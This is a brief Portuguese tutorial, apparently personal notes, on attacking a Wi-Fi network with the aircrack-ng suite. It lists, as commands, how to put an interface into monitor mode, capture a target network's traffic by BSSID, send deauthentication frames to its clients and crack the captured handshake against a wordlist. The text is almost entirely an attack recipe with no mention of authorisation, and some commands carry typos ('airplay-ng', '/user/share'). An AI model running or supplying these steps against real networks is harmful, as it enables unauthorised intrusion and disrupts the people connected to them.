## Airmon-ng

### Configurando a interface para o ataque

* Use o comando `airmon-ng` para mostrar as interfaces disponíveis.   
`airmon-ng`  

* Escolha a interface para o ataque.  
`airmon-ng start wlan1`

* Use o novamente o comando `airmon-ng` para verificar que a interface entrou em modo de monitoramento(promíscuo).
`airmon-ng`

### Obtendo informações sobre a rede a ser atacada

* Procure a rede a ser atacada.  
`tcpdump -i wlan1mon -s 64000 -p`

* Depois de escolher a rede, pegue informações sobre ela com o comando abaixo:  
`airodump-ng wlan1mon`

* Coloque as informações da rede escolhida. E escolha um nome para o arquivo `arquivo-x`.  
`airodump-ng --channel 11 --bssid 43:2C:FE:A4:B8:6C -w arquivo-x wlan1mon`

### Atacando

* `airplay-ng -0 5 -a 'bssid' -s 'station' `  
`airplay-ng -0 5 -a 43:2C:FE:A4:B8:6C -s 1C:2B:3D:4E:5F:6A wlan1mon`

* `aircrack-ng -w /user/share/wordlists/sqlmap.txt -b ´bssid-do-alvo´ arquivo-x-01.cap`  


#### Vídeo ensinando:
https://www.youtube.com/watch?v=XshYRVcGiDU&feature=youtu.be
